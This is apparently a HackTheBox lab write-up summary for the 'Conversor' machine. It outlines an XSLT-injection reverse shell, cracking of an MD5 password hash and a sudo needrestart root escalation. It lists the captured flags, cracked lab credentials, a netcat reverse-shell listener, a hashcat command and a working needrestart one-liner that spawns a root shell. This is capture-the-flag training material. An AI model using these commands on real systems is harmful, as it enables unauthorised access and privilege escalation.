# Conversor - HackTheBox Lab Case

## Target Information

| Property | Value |
|----------|-------|
| **IP Address** | 10.129.238.31 |
| **Hostname** | conversor.htb |
| **Operating System** | Ubuntu Linux (Kernel 4.15-5.19) |
| **Difficulty** | Easy |

## Objectives

### Objective 1: User Flag

- [x] **Status:** Completed
- **Flag:** `6a2e86cd4ecea33cf90b0b7fe4e18f4e`
- **Location:** `/home/fismathack/user.txt`

### Objective 2: Root Flag

- [x] **Status:** Completed
- **Flag:** `8318b96a9d2a55d01bace4ec243b4108`
- **Location:** `/root/root.txt`

## Attack Summary

### Initial Access Vector
XSLT Injection via XML converter functionality allowed writing a Python reverse shell to a cron-executed scripts directory.

### Privilege Escalation Path
1. **www-data:** XSLT file write + cron execution
2. **fismathack:** Cracked MD5 password hash from SQLite database
3. **root:** Sudo misconfiguration on `needrestart` utility

## Key Vulnerabilities Exploited

| Vulnerability | Severity | Impact |
|--------------|----------|--------|
| XSLT Injection (RCE) | Critical | Initial shell as www-data |
| Weak Password Hashing (MD5) | High | Lateral movement to fismathack |
| Sudo Misconfiguration | Critical | Root privilege escalation |

## Documentation

| Document | Description |
|----------|-------------|
| [conversor_pentest_report.md](conversor_pentest_report.md) | Full penetration test report |
| [logs/nmap_scan.log](logs/nmap_scan.log) | Nmap reconnaissance output |
| [evidence/](evidence/) | Supporting evidence and logs |
| [scans/](scans/) | Nmap scan files |
| [scripts/](scripts/) | Exploitation payloads |

## Quick Reference

### Credentials Discovered

| Username | Password | Source |
|----------|----------|--------|
| fismathack | Keepmesafeandwarm | SQLite DB (MD5 cracked) |
| Test | 1qaz2wsx!QAZ@WSX | Test account created |

### Services

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 |
| 80/tcp | HTTP | Apache 2.4.52 |

### Key Commands Used

```bash
# XSLT payload deployment
# See scripts/payload.xslt for full payload

# Reverse shell listener
nc -lvnp 4444

# Password cracking
hashcat -a 0 -m 0 '5b5c3ac3a1c897c94caad48e6c71fdec' /usr/share/wordlists/rockyou.txt

# SSH access
ssh fismathack@10.129.238.31

# Privilege escalation
echo 'exec "/bin/sh","-p";' > /tmp/con.conf
sudo /usr/sbin/needrestart -c /tmp/con.conf
```
